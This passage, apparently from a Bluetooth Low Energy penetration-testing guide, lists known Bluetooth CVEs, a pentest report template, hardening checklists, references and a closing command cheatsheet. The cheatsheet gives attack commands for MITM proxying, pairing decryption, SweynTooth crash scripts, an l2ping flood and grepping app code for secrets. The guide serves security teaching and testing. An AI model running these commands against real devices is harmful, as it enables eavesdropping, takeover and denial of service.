**CVE**: CVE-2017-0781, CVE-2017-0782, CVE-2017-0783, CVE-2017-0785, CVE-2017-8628, CVE-2017-14315  
**Affected**: Android, Linux, iOS, Windows — any device with Bluetooth enabled  
**Impact**: No pairing required; attacker can take over device, spread worm-like  
**Method**: RCE via malformed L2CAP packets (no authentication required)

### BLEEDINGBIT (2018)

**CVE**: CVE-2018-16986, CVE-2018-7080  
**Affected**: Texas Instruments BLE chips embedded in enterprise Wi-Fi access points  
**Impact**: Remote code execution on enterprise APs (Cisco, Meraki) via BLE

### KNOB Attack (Key Negotiation of Bluetooth — 2019)

**CVE**: CVE-2019-9506  
**Affected**: Bluetooth Classic BR/EDR (not BLE)  
**Impact**: Force minimum entropy key (1 byte), then brute-force session encryption  
**BLE Note**: BLE enforces minimum 7 bytes key size in spec, but SweynTooth CVE-2019-17518 can bypass this in some implementations

### BLESA (Bluetooth Low Energy Spoofing Attack — 2020)

**CVE**: CVE-2020-9770 (iOS)  
**Affected**: Linux BlueZ, Android, iOS (initially)  
**Impact**: Spoof reconnections; send fake data to central device  
**Method**: Exploits spec weakness — reconnection authentication is optional

### BIAS (Bluetooth Impersonation Attack — 2020)

**CVE**: CVE-2020-10135  
**Affected**: Bluetooth Classic (BR/EDR)  
**Impact**: Authenticate as a paired device without knowing LTK  
**Method**: Downgrade secure authentication, bypass mutual auth

### GATTacker / Insecure GATT Design (2016+)

Not a specific CVE — design-level weakness:
- Characteristics accessible without authentication
- Sensitive data exposed via Device Information Service
- Commands accepted without validation
- No replay protection on write commands

### CVE-2023-24023 — BLUFFS (Bluetooth Forward & Future Secrecy Attacks)

**Year**: 2023  
**Affected**: Bluetooth Classic (affects all standard-compliant implementations)  
**Impact**: Downgrade session key negotiation, impersonate devices  
**Method**: Exploits flaws in session key derivation standard

---

## 19. Reporting & Documentation

### Standard Pentest Report Structure

```markdown
# BLE Security Assessment Report

## Executive Summary
- Scope and tested devices
- Critical findings summary
- Risk rating overall
- Immediate actions required

## Methodology
- Testing phases followed
- Tools and hardware used
- Testing period and environment

## Findings

### FINDING-001: [Title]
**Severity**: Critical / High / Medium / Low / Informational  
**CVSS Score**: 9.8 (AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  
**CWE**: CWE-306 (Missing Authentication for Critical Function)  

**Description**:
[Detailed technical description]

**Steps to Reproduce**:
1. [Step 1]
2. [Step 2]

**Impact**:
[Business and technical impact]

**Evidence**:
[Screenshots, packet captures, command outputs]

**Recommendation**:
[Specific, actionable remediation steps]

**References**:
- [CVE/CWE/OWASP references]
```

### CVSS Scoring for BLE Findings

Key CVSS vectors for BLE:
- **AV (Attack Vector)**: A (Adjacent) — attacker must be in Bluetooth range (~10–100m)
- **AC (Attack Complexity)**: L (Low) or H (High) depending on requirements
- **PR (Privileges Required)**: N (None) / L (Low — paired) / H (High — admin)
- **UI (User Interaction)**: N (None) or R (Required — e.g., user must tap to pair)

### Evidence Collection Checklist

```
□ Full Wireshark/btmon packet captures (.pcap / .btsnoop)
□ Screenshots of GATT service/characteristic dump
□ Video recording of attack (for PoC demonstration)
□ Output of all tool commands
□ Device firmware version and hardware revision
□ Companion app version
□ Photos of PCB (for JTAG/debug pin identification)
□ Timeline of all testing activities
```

---

## 20. Defensive Countermeasures & Hardening

### For Developers & Manufacturers

#### Pairing & Authentication
- ✅ Always use **LE Secure Connections** (BLE 4.2+) — never rely on Legacy Pairing
- ✅ Set **MITM flag** in authentication requirements
- ✅ Use **Passkey Entry** or **OOB** — never ship products with "Just Works"
- ✅ Implement **application-level authentication** on top of BLE pairing
- ✅ Enforce **minimum key size** of 16 bytes in key size negotiation

#### GATT Security
- ✅ Require **authentication** (security level 3+) for all sensitive characteristics
- ✅ Apply **MITM protection** attribute permission on critical write handles
- ✅ Implement **input validation** on all writable characteristics (length, range, format)
- ✅ Do NOT expose serial numbers or device identifiers without authentication
- ✅ Implement **replay protection** (nonce/counter) for command characteristics
- ✅ Use **application-level encryption** (AES-128+) for sensitive data — don't rely on BLE link encryption alone

#### Address & Privacy
- ✅ Use **Resolvable Private Addresses (RPA)** — rotate frequently
- ✅ Enable **address randomization** in GAP settings
- ✅ Do NOT embed manufacturer-specific unique identifiers in advertisement data

#### Firmware & OTA
- ✅ Sign all OTA firmware packages (ECDSA P-256 minimum)
- ✅ Verify firmware signatures on device before applying
- ✅ Implement **rollback protection** (monotonic version counter in secure storage)
- ✅ Use **secure boot** to verify bootloader and application integrity
- ✅ Disable JTAG/SWD debug interfaces in production builds (disable via register/fuse)

#### Stack & Implementation
- ✅ Update BLE stack firmware regularly — check vendor CVE advisories
- ✅ Limit **maximum connections** and implement **rate limiting** on pairing
- ✅ Validate all received PDU lengths before processing
- ✅ Implement **watchdog timer** to recover from potential BLE stack crashes
- ✅ Test against SweynTooth and BrakTooth test suites pre-production

#### Companion App
- ✅ Do NOT hardcode UUIDs, keys, or credentials in the app
- ✅ Use **certificate pinning** for any backend API calls
- ✅ Implement **root/jailbreak detection** (defense-in-depth)
- ✅ Encrypt sensitive data stored locally (e.g., bonding keys)
- ✅ Minimize permissions — only request `BLUETOOTH_CONNECT` and `BLUETOOTH_SCAN` as needed (Android 12+)

---

## 21. References & Further Learning

### Essential GitHub Repositories

| Repository | URL | Stars | Purpose |
|---|---|---|---|
| awesome-bluetooth-security | https://github.com/engn33r/awesome-bluetooth-security | ⭐ High | Curated BLE security resources |
| BLE-Security-Attack-Defence | https://github.com/Charmve/BLE-Security-Attack-Defence | ⭐ High | BLE vulnerability PoCs and tools |
| sweyntooth_ble_attacks | https://github.com/Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks | ⭐ High | SweynTooth PoCs |
| BlueToolkit | https://github.com/sgxgsx/BlueToolkit | ⭐ Medium | 43 BT/BLE exploits framework |
| bettercap | https://github.com/bettercap/bettercap | ⭐⭐ Very High | BLE/WiFi recon + MITM |
| crackle | https://github.com/mikeryan/crackle | ⭐ High | BLE Legacy Pairing cracker |
| gattacker | https://github.com/securing/gattacker | ⭐ High | BLE MITM framework |
| btlejuice | https://github.com/DigitalSecurity/btlejuice | ⭐ High | BLE MITM + web UI |
| bleak | https://github.com/hbldh/bleak | ⭐⭐ Very High | Cross-platform Python BLE |
| blesuite | https://github.com/optiv/blesuite | ⭐ Medium | Python BLE security testing |
| BlueFusion | https://github.com/ebowwa/BlueFusion | ⭐ New 2024 | AI-powered BLE analysis |
| WHAD | https://github.com/whad-team/whad-client | ⭐ Medium | Modern wireless attack framework |
| Frankenstein | https://github.com/seemoo-lab/frankenstein | ⭐ High | BLE firmware fuzzer |
| ubertooth | https://github.com/greatscottgadgets/ubertooth | ⭐⭐ Very High | Ubertooth One tools |

### Key Research Papers

1. **SweynTooth** (USENIX ATC 2020) — Matheus Garbelini et al. — BLE LL vulnerabilities
2. **BLESA** (USENIX WOOT 2020) — Jianliang Wu et al. — Reconnection spoofing
3. **BlueBorne** (Armis Security 2017) — Ben Seri & Gregory Vishnepolsky — Airborne attacks
4. **GATTacking** (Black Hat USA 2016) — Slawomir Jasek — BLE MITM framework
5. **KNOB** (USENIX 2019) — Daniele Antonioli et al. — Key negotiation downgrade
6. **BIAS** (S&P 2020) — Daniele Antonioli et al. — Impersonation attacks
7. **BLUFFS** (2023) — Daniele Antonioli — Forward secrecy attacks
8. **Defeating BLE 5 PRNG** (DEF CON 27 2019) — Damien Cauquil — BLE 5 jamming
9. **Frankenstein** (USENIX 2020) — Ruge et al. — Advanced wireless firmware fuzzing
10. **ToothPicker** (USENIX WOOT 2020) — Heinze et al. — iOS Bluetooth stack fuzzing

### Conferences to Follow

- **Black Hat USA/EU/Asia** — BLE/Bluetooth security talks annually
- **DEF CON** — Wireless Village, IoT Village
- **USENIX Security** — Academic wireless security research
- **Hardwear.io** — Hardware security conference
- **35C3 / CCC** — European hacker congress

### Online Learning Resources

- **HackTricks BLE**: https://book.hacktricks.wiki/en/todo/radio-hacking/pentesting-ble-bluetooth-low-energy.html
- **SwisskyRepo Hardware**: https://swisskyrepo.github.io/HardwareAllTheThings/protocols/bluetooth/
- **Nordic DevAcademy**: https://academy.nordicsemi.com — Free BLE fundamentals course
- **Bluetooth SIG Specs**: https://www.bluetooth.com/specifications/specs/
- **OWASP IoT Attack Surface**: https://owasp.org/www-project-internet-of-things/
- **NIST SP 800-121 Rev 2**: BLE security guidelines

### Legal & Compliance References

- **FCC Part 15** (US) — Radio frequency regulations
- **Computer Fraud and Abuse Act (CFAA)** — US unauthorized access law
- **Computer Misuse Act** — UK equivalent
- **GDPR** — Data protection implications of BLE health/location data
- **FDA MDR** — Medical device BLE requirements
- **NIST SP 800-121** — US government BLE security guidance

---

## Quick Reference: Command Cheatsheet

```bash
# =================== SETUP ===================
sudo hciconfig hci0 up
sudo hciconfig -a

# =================== SCANNING ===================
bluetoothctl scan on
sudo hcitool lescan --active
sudo bettercap -eval "ble.recon on"

# =================== ENUMERATION ===================
sudo bettercap
>> ble.enum AA:BB:CC:DD:EE:FF

sudo gatttool -b AA:BB:CC:DD:EE:FF -I
>> connect
>> primary
>> characteristics
>> char-desc

# =================== READ/WRITE ===================
gatttool -b AA:BB:CC:DD:EE:FF --char-read -a 0x0012
gatttool -b AA:BB:CC:DD:EE:FF --char-write-req -a 0x0014 -n 01
gatttool -b AA:BB:CC:DD:EE:FF --char-write-req -a 0x0013 -n 0100 --listen  # Notify

# =================== SNIFFING ===================
sudo btmon -w capture.btsnoop
ubertooth-btle -f -c capture.pcap
ubertooth-btle -f -t AA:BB:CC:DD:EE:FF -c target.pcap

# =================== DECRYPTION ===================
./crackle -i capture.pcap -o decrypted.pcap

# =================== MITM ===================
node scan.js && node proxy.js -a AA:BB:CC:DD:EE:FF     # GATTacker
btlejuice-proxy && btlejuice -u <ip>                    # BTLEJuice

# =================== FUZZING ===================
python3 sweyntooth/ll_length_overflow.py AA:BB:CC:DD:EE:FF
python3 sweyntooth/run_all.py AA:BB:CC:DD:EE:FF

# =================== DOS ===================
sudo l2ping -i hci0 -f -s 512 AA:BB:CC:DD:EE:FF

# =================== APP REVERSING ===================
jadx -d output/ target.apk
grep -r "UUID\|passkey\|secret" output/ --include="*.java"
frida -U -l hook.js com.target.app
```

---

*Last Updated: March 2026 | Maintained by the security research community*  
*Always test ethically and with proper authorization. Happy (ethical) hacking! 🔵🔐*
